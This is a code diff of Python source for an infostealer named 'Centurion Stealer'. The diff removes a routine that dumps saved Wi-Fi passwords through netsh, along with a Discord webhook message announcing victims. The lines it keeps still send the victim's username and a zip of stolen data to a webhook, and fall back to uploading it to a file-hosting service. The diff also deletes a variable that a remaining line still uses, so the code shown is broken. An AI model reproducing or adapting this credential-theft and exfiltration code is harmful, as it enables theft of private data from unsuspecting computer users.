@@ -570,20 +570,6 @@ Antivirus: {avlist}
                 shutil.copy2(os.path.join(gdf, _file), gd + os.sep + _file)
     
     def SendInfo(self):
-        try:
-            command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
-            profile_names = set(re.findall(r"All User Profile\s*:(.*)", command_output))
-            wifi_data = ""
-            for profile in profile_names:
-                profile = profile.strip()
-                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True).stdout.decode()
-                profile_password = re.findall(r"Key Content\s*:(.*)", profile_info)
-                if len(profile_password) == 0:
-                    wifi_data += f"{profile}: Open\n"
-                else:
-                    wifi_data += f"{profile}: {profile_password[0].strip()}\n"
-        except Exception:
-            pass
         wname = self.getProductValues()[0]
         wkey = self.getProductValues()[1]
         ip = country = city = region = googlemap = "None"
@@ -648,42 +634,8 @@ Antivirus: {avlist}
             "username": f"{os.getlogin()} | Centurion",
             "avatar_url":"https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg"
         }
-        Network = {
-                    "username": f"Centurion Network Stealer",
-                    "content": "@everyone",
-                    "avatar_url": "https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg",
-                    "embeds": [
-                                {
-                                    "author": {
-                                        "name": "Centurion Stealer",
-                                        "url": "",
-                                        "icon_url": "https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg"
-                                    },
-                                    "description": f'**{os.getlogin()}** ran Nget Stealer.\n\n'
-                                                   f'<:members:1175028904474464256>  **Net Profile Names:** ```{profile_names}```\n'
-                                                   f'<:members:1175028904474464256>  **Network Info** ```{profile_info}```\n'
-                                                   f'<:members:1175028904474464256>  **Currently Connected** ```{profile}\n{profile_password}```\n'
-                                                   f'<:members:1175028904474464256>  Time: {"{:.2f}".format(time.time() - self.starttime)}s',
-                                    "inline": False,
-                                    "color": 0x00000,
-                                    "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
-                                    "thumbnail": {
-                                        "url": "https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg"
-                                    },
-                                    "footer": {
-                                        "text": "Centurion",
-                                        "icon_url": "https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg"
-                                    }
-                                }
-                            ]
-                        }         
-        fileEmbed = {
-            "username": f"{os.getlogin()} | Developed By nget",
-            "avatar_url":"https://cdn.discordapp.com/attachments/1181259134507692104/1186358780951285830/New_Project1.jpg"
-        }
         with open(_zipfile,'rb') as infozip:
             requests.post(self.webhook, json=embed)
-            requests.post(self.webhook, json=Network)
             if requests.post(self.webhook, data=fileEmbed, files={'upload_file': infozip}).status_code == 413:
                 infozip.seek(0)
                 server = requests.get('https://api.gofile.io/getServer').json()['data']['server']
